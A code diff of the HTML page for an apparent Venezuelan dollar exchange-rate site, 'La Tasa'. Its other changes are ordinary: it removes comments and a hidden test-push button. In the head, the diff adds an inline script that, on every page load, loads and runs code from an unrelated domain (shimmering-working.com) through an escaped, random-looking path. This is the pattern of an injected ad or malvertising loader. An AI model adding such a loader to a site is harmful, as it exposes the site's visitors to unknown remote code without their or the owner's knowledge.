@@ -4,6 +4,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="5f770545e75f1b1aa57ed3056200162e87d36a9f" content="5f770545e75f1b1aa57ed3056200162e87d36a9f" />
+
+    <script>
+        (function(qoew){
+        var d = document,
+            s = d.createElement('script'),
+            l = d.scripts[d.scripts.length - 1];
+        s.settings = qoew || {};
+        s.src = "\/\/shimmering-working.com\/cuD.9b6pbs2m5\/l\/S\/WlQI9vNdjKc\/5zMozwU\/y\/OrSz0y2ZNqzxkZzsNBTKMMzn";
+        s.async = true;
+        s.referrerPolicy = 'no-referrer-when-downgrade';
+        l.parentNode.insertBefore(s, l);
+        })({})
+    </script>
     <title>La Tasa - Dólar en Venezuela</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -457,7 +471,6 @@
             <div class="date-badge" id="currentDate">Cargando...</div>
         </header>
 
-        <!-- Download Section -->
         <div class="download-section">
             <div class="download-title">¡Descarga nuestra App! 📱</div>
             <div class="download-desc">
@@ -473,12 +486,6 @@
                 <span style="color: white; font-weight: 800; font-size: 1.1rem;">
                     <span id="countText">0</span> descargas
                 </span>
-            </div>
-
-            <!-- Diagnostic Trigger -->
-            <div style="margin-top: 15px; opacity: 0.1;">
-                <button onclick="testPush()"
-                    style="background: none; border: 1px solid var(--text-dim); color: var(--text-dim); font-size: 0.6rem; cursor: pointer; padding: 2px 5px; border-radius: 4px;">Push</button>
             </div>
         </div>
 
@@ -499,7 +506,6 @@
         </footer>
     </div>
 
-    <!-- Modals (Same logic as before, new style) -->
     <div class="modal-overlay" id="legalModal">
         <div class="modal-content">
             <div class="modal-title">Aviso Legal y Privacidad</div>
@@ -526,7 +532,6 @@
         </div>
     </div>
 
-    <!-- Cookie Banner -->
     <div id="cookieBanner" class="cookie-banner">
         <div class="cookie-text">
             Este sitio utiliza cookies para una mejor experiencia.
@@ -597,15 +602,6 @@
             const input = document.getElementById(`input-${id}`);
             input.value = amount;
             calculate(id, rawRate);
-        }
-
-        async function testPush() {
-            if (!confirm("¿Enviar notificación de prueba a todos?")) return;
-            try {
-                const response = await fetch('/api/test-push', { method: 'POST' });
-                const data = await response.json();
-                alert(data.message || data.error);
-            } catch (e) { alert("Error"); }
         }
 
         async function fetchStats() {
